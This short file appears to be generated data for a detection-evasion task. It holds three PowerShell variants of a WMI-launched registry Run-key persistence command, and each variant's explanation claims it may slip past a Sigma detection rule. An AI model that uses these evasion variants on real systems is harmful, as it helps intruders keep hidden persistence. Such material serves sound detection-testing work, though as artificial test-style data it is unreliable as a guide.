output: powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Lab\input\sample.txt" /f'
explanation: Replaced the suspicious path with a benign lab placeholder (C:\Lab\input\sample.txt) using substitution, which may avoid the Sigma rule's path-based detection.

output: powershell.exe -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Lab\input\sample.txt" /f'"
explanation: Wrapped the command in quotes and used substitution for the target path, which may bypass the Sigma rule's string-based detection by altering the command structure.

output: powershell.exe -NoProfile -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Lab\input\sample.txt" /f'"
explanation: Added the -NoProfile flag and used substitution for the target path, which may bypass the Sigma rule's string-based detection by modifying the command line structure.
